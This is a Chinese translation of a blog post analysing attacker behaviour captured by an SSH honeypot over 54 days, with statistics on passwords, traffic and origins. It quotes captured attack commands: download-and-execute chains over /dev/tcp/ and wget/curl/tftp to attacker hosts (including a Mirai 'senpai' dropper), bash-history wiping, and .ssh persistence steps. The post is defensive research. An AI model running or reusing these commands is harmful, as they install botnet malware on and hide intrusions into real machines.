# 我把 22 端口暴露在互联网上 54 天，结果谁都来了

序言：这篇实测文章很直观地展示了一个事实 - 只要 SSH 暴露在公网，扫描和尝试登录几乎会立刻开始，而且规模远超多数人的直觉。
原文：[I Left Port 22 Open on the Internet for 54 Days. Here's Who Showed Up.](https://arman-bd.hashnode.dev/i-left-port-22-open-on-the-internet-for-54-days-here-s-who-showed-up)（作者：Arman Hossain，发布日期：2026-04-24）

---

## 实验设置

这里有个思想实验：如果你只是把一台机器放到互联网上，然后等待，会发生什么？

当然不是真机，而是一台*假的*机器。它是一个蜜罐：用 Python 脚本伪装成 Ubuntu 22.04 + OpenSSH 8.9 服务器。它看起来很真，体验也很真。你输什么密码它都“接受”，并带一个可信的延迟，然后把你丢进一个带真实目录结构的 shell，最后把你做的每件事都记进 JSON 日志。

转折在于：没有任何东西是真的。文件是假的，命令是模拟的。你刚才跑的 `wget`？它会假装下载 8 秒，还给你进度条。`apt install`？它会告诉你包已经装好了。与此同时，你的每一次击键、每一组凭据、每一条命令，都会被静悄悄写入日志。

我在 2026 年 2 月 11 日把它部署进一个 Docker 容器，对外暴露 22 端口，然后转身离开。

54 天后回来，我得到了 **317 MB 日志**。

---

## 前 60 秒

蜜罐上线还不到 1 分钟，第一批访客就来了。

```text
2026-02-11T20:41:15Z  connection  103.215.xx.xx
2026-02-11T20:41:16Z  connection  190.181.xx.xx
2026-02-11T20:41:17Z  login       root / yhsj_idc@act
2026-02-11T20:41:17Z  login       root / oracle123
```

两个 IP。两次登录尝试。两组密码。有人在某个地方真心觉得它们可能在一台随机服务器上有效。两次尝试间隔不到 2 秒。

这并不是有人专门扫描我的机器，而是互联网背景辐射：自动化系统在全球范围内持续扫描每个 IP 的每个端口，全天候、无休止。如果你的机器曾经开过 22 端口，这些事一直都在发生。

---

## 数据规模

先看原始体量：

![连接与登录总体规模统计图](https://images.animesdata.com/news/2026/05/07/69fbf302ced7b.png)

平均下来约 **每天 4,987 次连接**，也就是 **每分钟 3.5 次**，全天不停。凌晨 3 点不会停，周末不会停，节假日也不会停。机器不睡觉。

![日均连接与时间分布图](https://images.animesdata.com/news/2026/05/07/69fbf321708fb.png)

---

## 密码耻辱墙

在 255,566 次登录尝试、48,102 个唯一密码中，下面这些是“金曲榜”：

![高频密码统计图](https://images.animesdata.com/news/2026/05/07/69fbf310cb21e.png)

那些老熟人依旧是老熟人，令人沮丧。仅 `123456` 就占了全部尝试的 10% 以上。

但 `3245gs5662d34` 和 `345gs5662d34` 为什么能排在第 3 和第 4？它们不是词典词，而是某些 IoT 设备或固件里的**硬编码默认凭据**。某个僵尸网络把它们写死在攻击逻辑里，向全网喷射，希望撞中对应设备。两者合计尝试超过 11,000 次。

还有加密货币线索：`solana`（1,155 次）、`sol`（927 次）、`validator`（708 次）、`node`（598 次）。攻击者在主动搜寻 **Solana 验证节点**。他们尝试 `solana`、`sol`、`solv`、`validator`、`node` 这些用户名，并配对类似密码。很明显，有人认定加密节点运维是高价值目标，并且已经构建了专门的僵尸网络去找它们。

---

## 登录成功后他们会做什么

这里开始有意思了。机器人“一旦”登录成功（别忘了：所有密码都会成功），下一步做什么？

绝大多数，也就是 **99.6% 的攻击者**，从不打开交互式 shell。它们用 SSH 的 exec 模式打一条命令就断开：

```text
  Command                                              Count
  -------                                              -----
  uname -s -v -n -r -m                                94,572
  export PATH=... ; uname=$(uname -s -v -n -m ...)    63,810
  echo -e "\x6F\x6B"                                   32,656
  /bin/./uname -s -v -n -r -m                         14,031
  cd ~; chattr -ia .ssh; lockr -ia .ssh                6,041
```

模式非常清楚：**先指纹识别，再离开**。先跑 `uname` 看系统类型。输出像目标就稍后回投真实载荷。`echo "\x6F\x6B"`（解码就是 “ok”）是最简单的存活探测，3.2 万多个 IP 只想确认 shell 还活着。

`chattr -ia .ssh` 这条尤其典型：它试图去掉 `.ssh` 目录的不可变属性，常见用途是往 `authorized_keys` 注入公钥，建立持久化访问。

---

## 流量模式

按天的连接量能看出一条曲线：

![每日连接量趋势图](https://images.animesdata.com/news/2026/05/07/69fbf319141f2.png)

前两周随着更多僵尸网络发现这个 IP，流量稳步上升。3 月 2 日附近冲到峰值，单日接近 **23,000 次连接**，约 **每分钟 16 次**。3 月中旬之后明显回落。

为什么回落？很可能是僵尸网络已经给这个 IP 打完标签：这个主机会响应 SSH、接受密码、内核 Linux 5.15。它们拿到想要的信息后，持续高频重扫阶段结束，只剩长尾和新入场僵尸网络。

### 他们在什么时间攻击？

![按小时攻击分布图](https://images.animesdata.com/news/2026/05/07/69fbf3153b815.png)

攻击在 **01:00-04:00 UTC** 达峰，在 **07:00-09:00 UTC** 降到低谷。这不是机器人会疲劳，更可能是亚洲地区 C2 在其工作时段最活跃，叠加欧洲 C2 在 UTC 夜间窗口的负载。

![按星期攻击分布图](https://images.animesdata.com/news/2026/05/07/69fbf2fca4dc5.png)

周一和周日最忙。僵尸网络也有“作息”。

---

## 攻击源来自哪里

![国家与地区来源分布图](https://images.animesdata.com/news/2026/05/07/69fbf307b8e8b.png)

攻击来自 **所有有人类居住的大洲**。美国居首（244,291 次事件，1,861 个 IP），其后是澳大利亚（188,922）、比利时（156,599）、德国（112,774）、荷兰（107,535）。

但这些数字容易误读。“澳大利亚”不代表澳大利亚人正在攻击，而是**悉尼云数据中心**很受僵尸网络操作者青睐。澳洲 IP 基本都能追到廉价 VPS 提供商。荷兰、新加坡、美国的大量流量也是同一逻辑：主要是云基础设施，不是真人终端。

比利时流量几乎全部来自**一个住宅 IP**：单机发了超过 **156,000 次登录尝试**，比德国全境还多。它连续几周每秒都在锤 `echo "\x6F\x6B"`，毫不停歇。

### 这些 IP 背后是什么网络类型？

![云主机与住宅网络占比图](https://images.animesdata.com/news/2026/05/07/69fbf2f8c75d6.png)

7,556 个攻击 IP 里，结构几乎对半：**52% 云/VPS（3,940）**，**48% 住宅/ISP（3,619）**。但云基础设施贡献了 59% 的登录量，输出明显更高。住宅侧更分散：成千上万台被控家用路由器和 IoT 设备，各自占比小，但合起来攻击面巨大。

头部来源非常清楚：

| Source | Type | IPs | Events | % of Total |
| --- | --- | ---: | ---: | ---: |
| US-based Cloud VPS Provider | Cloud | 1,548 | 632,592 | 47% |
| Belgian Residential ISP | ISP | 1 | 156,013 | 12% |
| European Hosting Company | Hosting | 48 | 74,525 | 6% |
| European Cloud Provider | Cloud | 108 | 33,799 | 3% |
| Middle Eastern Telecom | ISP | 2 | 29,009 | 2% |
| South American Research Network | ISP | 5 | 26,856 | 2% |
| Mexican Telecom | ISP | 7 | 24,040 | 2% |
| European Managed Hosting | Hosting | 2 | 23,897 | 2% |
| Asian Cloud Provider | Cloud | 60 | 16,869 | 1% |
| Chinese Tech Company | Cloud | 44 | 15,652 | 1% |

单个云 VPS 提供商就占去接近一半流量：1,548 个 IP 贡献 632,592 次事件。前五大来源合计 **69%**。但长尾同样关键：前 15 名里有 3 项是**单 IP**，分别来自比利时住宅网络、东南亚某军方通信网络、南美某高校服务器，各自都安静地输出了数万次尝试。

悉尼、阿姆斯特丹、法兰克福在城市榜靠前，不是攻击者住在那里，而是廉价云机房在那里。

一些更意外的来源：东南亚某军方信号部队的一台机器贡献了 12,310 次尝试；南美一台大学研究服务器贡献了 11,116 次。两者都极可能是被攻陷后当作中继使用，资产所有者并不知情。

---

## 0.4%：真正“进来操作”的人

7,556 个攻击 IP 里，只有 **28 个**曾经打开交互式 shell，占 0.4%。其余全是自动化：打指纹，走人。

但这 28 个才是有意思的。他们手打命令、会输错字、会探索目录，带着明确意图。

![交互式会话样本概览图](https://images.animesdata.com/news/2026/05/07/69fbf30ca702f.png)

### 好奇探索者（喀麦隆）

```text
165.210.xx.xx  |  Yaounde, Cameroon  |  Residential ISP

root$ ls
root$ neofetch
root$ apt install neofetch
root$ lscpu
root$ cd Downloads
root$ ls
root$ cd Documents
root$ ls
root$ free -h
root$ sudo apt install nano
root$ screenfetch
root$ ping 8.8.8.8
root$ sudo reboot
root$ exit
```

这个案例很有意思。对方登录后先试 `neofetch`（漂亮展示系统信息的工具），发现没装就 `apt install neofetch`。之后像进了别人私人电脑一样逛 `Downloads`、`Documents`，还想装 `nano`。`neofetch` 不行就改跑 `screenfetch`，然后 ping Google，尝试重启，最后退出。

这更像是一个*刚学会*“能进服务器”的人，带着真好奇在探索，而不是老手攻击者。某个时刻他还把 `lscpu` 打成了 `lscou`。机器人不会打错字。

### 反取证小队（荷兰、瑞典）

来自荷兰和瑞典的 3 个不同 IP，一进 shell 就做同一件事：

```text
ubuntu$ ls 2>/dev/null
ubuntu$ export HISTFILE=/dev/null
ubuntu$ export HISTSAVE=/dev/null
ubuntu$ unset HISTFILE
ubuntu$ export HISTFILE=/dev/null
ubuntu$ export HISTSAVE=/dev/null
ubuntu$ unset HISTFILE
```

他们在做任何事情之前先关 bash 历史记录，而且反复执行，显然非常不想留下命令痕迹。

讽刺的是，这个蜜罐根本不依赖 bash history，而是在传输层记日志。每条 `export HISTFILE=/dev/null` 都被完整记录、打上时间戳并归档。

### 职业选手（法国，租用 VPS）

还有一个明显“会干活”的：

```text
213.199.xx.xx  |  Lauterbourg, France  |  VPS Provider

root$ nohup bash -c "exec 6<>/dev/tcp/213.199.xx.xx/60133 \
  && echo -n 'GET /linux' >&6 \
  && cat 0<&6 > /tmp/qNXtkNCRu0 \
  && chmod +x /tmp/qNXtkNCRu0 \
  && /tmp/qNXtkNCRu0 iO0lOO2Dg/IgJfKIj+4sIOyL..." &
root$ dd bs=1 count=1911588 > /tmp/YUHlmPSdG7
```

这完全是另一种层级。它做了这些事：

1. 通过 `/dev/tcp/` 打开原始 TCP 套接字，不用 `wget`、`curl` 这类容易暴露在进程列表中的工具。
2. 通过 `GET /linux` 直接走 socket 拉取二进制。
3. 赋可执行权限并启动，附带长 base64 载荷（很可能是 C2 配置或密钥）。
4. 全流程包在 `nohup` 里，保证 SSH 断开后仍继续运行。
5. 通过 `dd` 尝试写入一个 UPX 压缩的 ELF 可执行文件。

这套流程在 3 天内重复了 **6 次**，并轮换了 **4 个 C2 服务器**（`213.199.xx.xx`、`47.243.xx.xx`、`47.82.xx.xx`、`47.236.xx.xx`）。每次都会换随机临时文件名和不同编码载荷。

这不是脚本小子，而是有基础设施的职业化僵尸网络操作者。

### IoT 难民（纽约）

```text
85.239.xx.xx  |  New York  |  Cloud Hosting

admin$ enable
admin$ system
admin$ shell
admin$ sh
admin$ linuxshell
admin$ cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
admin$ rm -rf shr; wget http://202.155.xx.xx/shr || curl -O http://202.155.xx.xx/shr \
       || tftp 202.155.xx.xx -c get shr || tftp -g -r shr 202.155.xx.xx; \
       chmod 777 shr; ./shr ssh; rm -rf shr
```

这个机器人以为自己连到的是一台**路由器**。`enable`、`system`、`shell` 是典型 Cisco IOS 从受限 CLI 逃到系统 shell 的命令。由于蜜罐返回的是空输出而不是报错，它就误判“已拿到 shell”，随后投放了 Mirai 僵尸网络的 “senpai” 变种。

它的下载链路有四层回退：`wget`、`curl`、`tftp`（客户端模式）、`tftp`（另一种语法）。下载后 `chmod 777`，以 `ssh` 参数启动（表示继续通过 SSH 传播），再自删。`rootsenpai` 是它的“到此一游”标记，用来标识已感染主机。

同样流程连续执行了 **4 次**。非常执着。

---

## 最常见的账号密码组合

最常被尝试的用户名+密码组合是什么？

![账号密码组合排行榜](https://images.animesdata.com/news/2026/05/07/69fbf31d0d861.png)

对加密节点的狩猎非常明显。前 15 组合里有 5 组专门瞄准 Solana 基础设施。有人构建（或租用）了专门找弱安全验证节点的僵尸网络。

那他们最常尝试登录成谁？

![高频用户名分布图](https://images.animesdata.com/news/2026/05/07/69fbf2ffd0af2.png)

`root` 占了超过一半尝试。但 `sol` 和 `solana` 也稳定出现在中间位置：加密节点狩猎就这样混在海量服务账号喷射里。

---

## 我学到的事

### 1. 互联网很吵

你的服务器并不特殊。没人需要“专门盯上”你。全网每个 IP 都在被自动化系统持续探测。22 端口一暴露，几秒内就会收到登录尝试。问题不是“会不会”，而是“什么时候” - 答案是“立刻”。

### 2. 大多数攻击者并不聪明

99.6% 访客连交互 shell 都没进，只执行一条自动命令就走。他们不是黑客，而是被控机器上的脚本，按 C2 指令在全球海量 IP 上重复跑同一条 `uname`。互联网攻击里的大头其实是噪声。

### 3. 少数聪明的攻击者非常聪明

那个使用 `/dev/tcp/`、轮换 C2、投放 UPX 二进制的法国 IP，代表的是职业级进攻工具链。攻击者的前 1% 和后 99% 差距巨大。

### 4. 加密基础设施自带“吸引力”

针对 Solana 节点凭据（`solana`/`sol`/`validator`/`node`）的尝试量非常高。任何在公网 SSH 上暴露、且不用密钥认证的加密节点，都会被主动狩猎。

### 5. 有些人只是好奇

喀麦隆那位探索者、柏林那位慢慢输入命令的人、孟加拉那位会去翻 `/var` 并创建 `text.txt` 的访客，他们不像恶意操作者，更像只是想看看“门后有什么”的好奇人类。他们没下恶意程序，也没做持久化，只是到处看。

### 6. 没人看 MOTD

蜜罐登录后会显示完整 Ubuntu 欢迎信息和系统统计。没有任何交互用户看起来在意这些信息静态得异常。第一件事永远是：`ls`。

---

## 技术实现（实验环境）

给想自己复现的人：

- **语言**：Python 3.11，使用 **paramiko** 处理 SSH 协议
- **部署**：Docker 容器，对外开放 22 端口
- **日志**：结构化 JSON Lines，一行一个事件
- **假 shell**：支持约 40 条命令并给出拟真输出（`ls`、`cat`、`ps`、`wget`、`apt`、`ifconfig` 等）
- **智能延迟**：破坏性/下载类命令（`wget`、`curl`、`apt install`）随机延迟 5-10 秒，用于消耗攻击者时间
- **容量**：50 并发连接，5 分钟会话超时

整个系统就是一个 816 行 Python 文件。无框架、无数据库、除 paramiko 外无外部依赖。

---

## 最后一句

互联网上每分钟、每天，都有成千上万台机器在挨个敲门，尝试每一把钥匙。大多数都在自动驾驶：脚本由某人编写，部署在被攻陷基础设施上，再通过默认凭据和懒惰安全策略继续扩散。

你的 SSH 服务器不是孤岛，它是“每晚所有门都会被试锁一次”的街区里的一栋房子。问题不是会不会有人试你的锁，而是你的锁到底够不够好。

*使用密钥认证。关闭密码登录。把 SSH 移出 22 端口。以及，如果你足够好奇，可以留一扇假门，看看谁会走进来。*

---

*数据采集区间：2026-02-11 至 2026-04-05。所有 IP 均已部分脱敏。地理数据来源：ip-api.com。*
